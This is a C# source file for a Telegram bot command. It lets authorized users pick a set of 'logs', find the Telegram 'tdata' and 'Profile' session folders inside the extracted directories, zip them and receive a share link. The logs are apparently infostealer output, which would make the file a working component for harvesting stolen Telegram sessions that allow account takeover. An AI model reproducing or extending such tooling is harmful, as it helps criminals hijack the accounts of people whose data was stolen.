using Core.Models;
using Core.Models.Extensions;
using TelegramBot.Extensions;
using TelegramBot.Models;
using TelegramBot.Services;
using TL;
using WTelegram;

namespace TelegramBot.Commands.Services;

public class TelegramServiceCommand(Client client, DataService data) : ICommand, ICallbackCommand
{
    public bool AuthorizedOnly { get; } = true;

    public Task Invoke(UpdateNewMessage update, User user) => client.SendMessageAvailableLogs(user, data, "Telegram");

    public async Task Invoke(UpdateBotCallbackQuery update, User user)
    {
        if (await client.SendCallbackAvailableLogsOrGetPath(user, data, update.msg_id, update.data) is not {} logsname) return;

        var zippath = data.CreateZipPath(logsname, "Telegram");

        await client.EditMessage(user, update.msg_id, $"Telegram\nParsing from {logsname}");

        var zip = new ZipArchive(zippath);
        
        Directory.GetDirectories(data.GetExtractedPath(logsname))
            .Select(x => Directory.GetDirectories(x, "Telegram", SearchOption.AllDirectories).FirstOrDefault())
            .Where(x => x is not null)
            .Where(x =>
            {
                var name = x![(x.LastIndexOf('\\') + 1)..];
                return name.StartsWith("Profile") || name.StartsWith("tdata");
            })
            .SelectPerTask(x => zip.AddDirectoryAsync(x).GetAwaiter().GetResult());

        await client.Messages_SendMessage(user, $"{logsname}\n{await data.GetShareLinkAsync(zippath)}", Random.Shared.NextInt64(), clear_draft: true);
    }
}